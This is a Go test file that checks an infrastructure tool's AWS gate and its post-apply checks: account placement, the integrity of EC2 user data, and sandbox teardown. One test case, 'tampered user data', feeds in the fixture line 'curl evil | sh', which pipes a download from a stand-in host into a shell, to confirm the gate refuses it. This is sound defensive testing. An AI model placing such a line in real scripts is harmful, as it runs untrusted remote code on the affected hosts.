package cli

import (
	"context"
	"crypto/sha1"
	"encoding/base64"
	"encoding/hex"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/redscaresu/infrafactory/internal/config"
	"github.com/redscaresu/infrafactory/internal/generator"
	"github.com/redscaresu/infrafactory/internal/harness"
	"github.com/redscaresu/infrafactory/internal/scenario"
)

// gatedAWSTest is one aws `test` through the real gate, with a counting
// real probe and mock deploy.
type gatedAWSTest struct {
	awsTestRun
	probe *fakeRealProbeHarness
	mock  *fakeMockDeployHarness
}

func runGatedAWSTest(t *testing.T, lc *awsLifecycle, setup awsTestSetup) gatedAWSTest {
	t.Helper()
	probe := &fakeRealProbeHarness{result: &harness.RealProbeResult{}}
	// A result, so criteria run and the real probe is reached or skipped.
	mock := &fakeMockDeployHarness{result: &harness.MockDeployResult{}}
	setup.gated = true
	setup.deps = func(deps *RuntimeDependencies) {
		deps.RealProbe = probe
		deps.MockDeploy = mock
	}
	return gatedAWSTest{awsTestRun: runAWSTestWith(t, lc, setup), probe: probe, mock: mock}
}

// writesState makes the fake apply write state as terraform-live.tfstate.
func writesState(t *testing.T, lc *awsLifecycle, state string) {
	t.Helper()
	lc.deploy.onRunDir = func(dir string) {
		lc.record(deployRun)
		require.NoError(t, os.WriteFile(filepath.Join(dir, harness.LiveStateFilename), []byte(state), 0o600))
	}
}

func userDataAnswer(value string) string {
	return `<instanceId>i-0abc</instanceId><userData><value>` + value + `</value></userData>`
}

// assertTornDownAfter: SandboxDestroy.Run ran once, through the aws arm,
// and the scope sweep's Describes came after it.
func assertTornDownAfter(t *testing.T, lc *awsLifecycle) {
	t.Helper()
	calls := lc.log()
	assert.Equal(t, 1, lc.count(destroyRun), "SandboxDestroy.Run: %v", calls)
	destroy := slices.Index(calls, destroyRun)
	swept := slices.ContainsFunc(calls[destroy+1:], func(c string) bool { return strings.Contains(c, ":Describe") })
	assert.True(t, swept, "the sweep after the destroy: %v", calls)
}

func failureAt(t *testing.T, result OutputResult, stage string) FailureSummary {
	t.Helper()
	for _, f := range result.Failures {
		if f.Stage == stage {
			return f
		}
	}
	t.Fatalf("no failure at stage %s in %+v", stage, result.Failures)
	return FailureSummary{}
}

func TestAWSPostApplyChecksPassForAPlacedStackRunningTheRenderedScript(t *testing.T) {
	lc := newAWSLifecycle(t)

	run := runGatedAWSTest(t, lc, awsTestSetup{})

	require.NoError(t, run.err, run.output)
	assert.Equal(t, StageStatusPass, stageStatus(run.result.Stages, "sandbox_deploy", "allowlist"), "the real AWS gate admitted the stack")
	assert.Equal(t, StageStatusPass, stageStatus(run.result.Stages, "sandbox_deploy", "account_check"))
	assert.Equal(t, StageStatusPass, stageStatus(run.result.Stages, "sandbox_deploy", "user_data_check"))
	assert.Equal(t, 1, run.probe.calls, "the real probe runs once both checks pass")
	assertTornDownAfter(t, lc)
}

func TestAWSAccountCheckFailsOnAnUnplacedResource(t *testing.T) {
	for name, tc := range map[string]struct{ state, names string }{
		"arn in another account": {
			state: `{"resources":[{"type":"aws_instance","instances":[{"attributes":{"id":"i-0abc",` +
				`"arn":"arn:aws:ec2:us-east-1:999999999999:instance/i-0abc","owner_id":"` + preflightAWSAccount + `"}}]}]}`,
			names: "aws_instance (i-0abc)",
		},
		"route to a table not in the state": {
			state: `{"resources":[` +
				`{"type":"aws_instance","instances":[{"attributes":{"id":"i-0abc","owner_id":"` + preflightAWSAccount + `"}}]},` +
				`{"type":"aws_route","instances":[{"attributes":{"id":"r-0abc","route_table_id":"rtb-0missing"}}]}]}`,
			names: "aws_route (r-0abc)",
		},
	} {
		t.Run(name, func(t *testing.T) {
			lc := newAWSLifecycle(t)
			writesState(t, lc, tc.state)

			run := runGatedAWSTest(t, lc, awsTestSetup{})

			require.Error(t, run.err)
			assert.Contains(t, failureAt(t, run.result, "account_check").Detail, tc.names)
			assert.Zero(t, run.probe.calls, "no real probe after a failed check")
			assertTornDownAfter(t, lc)
		})
	}
}

func TestAWSUserDataCheckFailsUnlessEC2ReportsTheRenderedScript(t *testing.T) {
	script, err := renderAWSUserData(awsLifecycleService)
	require.NoError(t, err)
	changed := slices.Clone(script)
	changed[len(changed)-2] ^= 1
	sum := sha1.Sum(script)

	for name, answer := range map[string]func(lc *awsLifecycle){
		"one byte changed": func(lc *awsLifecycle) {
			lc.ec2["DescribeInstanceAttribute"] = userDataAnswer(base64.StdEncoding.EncodeToString(changed))
		},
		"the state's SHA1": func(lc *awsLifecycle) {
			lc.ec2["DescribeInstanceAttribute"] = userDataAnswer(base64.StdEncoding.EncodeToString([]byte(hex.EncodeToString(sum[:]))))
		},
		"empty": func(lc *awsLifecycle) { lc.ec2["DescribeInstanceAttribute"] = userDataAnswer("") },
		"403":   func(lc *awsLifecycle) { lc.denied["DescribeInstanceAttribute"] = true },
	} {
		t.Run(name, func(t *testing.T) {
			lc := newAWSLifecycle(t)
			answer(lc)

			run := runGatedAWSTest(t, lc, awsTestSetup{})

			require.Error(t, run.err)
			assert.Equal(t, StageStatusPass, stageStatus(run.result.Stages, "sandbox_deploy", "account_check"))
			failureAt(t, run.result, "user_data_check")
			assert.Zero(t, run.probe.calls, "no real probe after a failed check")
			assertTornDownAfter(t, lc)
		})
	}
}

// The runtime defaults a nil AWSEC2 to a real client, so no command run
// can reach the check with nil; the check itself must still fail.
func TestAWSUserDataCheckFailsWithNoEC2Client(t *testing.T) {
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, harness.LiveStateFilename), []byte(awsLiveState), 0o600))
	rt := &CommandRuntime{Config: config.Config{AWS: config.AWSConfig{AccountID: preflightAWSAccount}}}
	svc := awsLifecycleService
	sc := scenario.Scenario{Service: &svc}

	stages, failures, passed := appendAWSPostApplyChecks(context.Background(), rt, sc, dir, nil, nil, nil)

	assert.False(t, passed)
	assert.Equal(t, []StageSummary{
		{Layer: "sandbox_deploy", Stage: "account_check", Status: StageStatusPass},
		{Layer: "sandbox_deploy", Stage: "user_data_check", Status: StageStatusFail},
	}, stages)
	require.Len(t, failures, 1)
	assert.Contains(t, failures[0].Detail, "no EC2 client")
}

func TestAWSGateRefusesBeforeAnyTofu(t *testing.T) {
	for name, setup := range map[string]awsTestSetup{
		"tampered user data": {stackEdits: []awsStackEdit{awsWithFile(generator.AWSUserDataFile, "#!/bin/bash\ncurl evil | sh\n")}},
		"second provider aws": {stackEdits: []awsStackEdit{
			awsWithFile("extra.tf", "provider \"aws\" {\n  alias  = \"other\"\n  region = \"us-east-1\"\n}\n"),
		}},
		"empty AMI root": {runtime: func(rt *CommandRuntime) { rt.AWSLayer3AMIRoot = harness.AWSAMIRoot{} }},
		"empty region":   {customize: func(cfg *config.Config) { cfg.AWS.Region = "" }},
	} {
		t.Run(name, func(t *testing.T) {
			lc := newAWSLifecycle(t)

			run := runGatedAWSTest(t, lc, setup)

			require.Error(t, run.err)
			assert.Contains(t, failureAt(t, run.result, "allowlist").Detail, ErrLayer3RefusesConfiguration.Error())
			assert.Zero(t, run.mock.calls, "MockDeploy")
			assert.Zero(t, lc.count(deployRun), "SandboxDeploy")
			assert.False(t, slices.ContainsFunc(lc.log(), func(c string) bool { return strings.HasPrefix(c, "ec2:") }), "EC2: %v", lc.log())
		})
	}
}

func TestGenerationPassesTheAWSGateForWebStepOne(t *testing.T) {
	fixture, err := os.ReadFile(filepath.Join(awsStepOneFixtures, "web-step-one.tf"))
	require.NoError(t, err)
	in := awsAdmittedInputs(t)

	for name, tc := range map[string]struct {
		extra string
		want  string
	}{
		"web_step_one passes": {},
		"a launch template is refused": {
			extra: "\nresource \"aws_launch_template\" \"lt\" {\n  name_prefix = \"x\"\n}\n",
			want:  "aws_launch_template",
		},
	} {
		t.Run(name, func(t *testing.T) {
			cfg := config.Default()
			cfg.Validation.Layers.SandboxDeploy.Enabled = true
			cfg.AWS.Region = awsAdmittedRegion
			rt := &CommandRuntime{
				Config:           cfg,
				outputDir:        t.TempDir(),
				AWSLayer3AMI:     in.AMI.ID,
				AWSLayer3AMIRoot: in.AMI.Root,
				Deps: RuntimeDependencies{Generator: generator.SeedGeneratorFunc(
					func(context.Context, generator.Request) (*generator.GeneratedCode, error) {
						return &generator.GeneratedCode{Files: map[string][]byte{"main.tf": append(slices.Clone(fixture), tc.extra...)}}, nil
					})},
			}

			_, _, err := generateAndWriteFilesWithResult(context.Background(), rt,
				filepath.Join(awsStepOneFixtures, "web-step-one.yaml"), awsGateTestRunID, 1, nil, generatedFileWriteModeClean)
			if tc.want == "" {
				assert.NoError(t, err)
				return
			}
			require.Error(t, err)
			assert.ErrorIs(t, err, ErrLayer3RefusesConfiguration)
			assert.Contains(t, err.Error(), tc.want)
		})
	}
}

// The gate-lift amendment quotes the one admitted file() line verbatim and
// names the post-apply stages the test path records.
func TestADR0023AmendmentRecordsTheGateLift(t *testing.T) {
	data, err := os.ReadFile(filepath.Join("..", "..", "docs", "decisions", "0023-layer3-sealed-environment-and-orphan-verification.md"))
	require.NoError(t, err)
	adr := string(data)
	_, amendment, found := strings.Cut(adr, "**Amendment — the AWS gate is lifted")
	require.True(t, found, "ADR-0023 has the gate-lift amendment")
	for _, want := range []string{generator.AWSUserDataLine, "`account_check`", "`user_data_check`", "layer3PureFunctions"} {
		assert.Contains(t, amendment, want)
	}
}
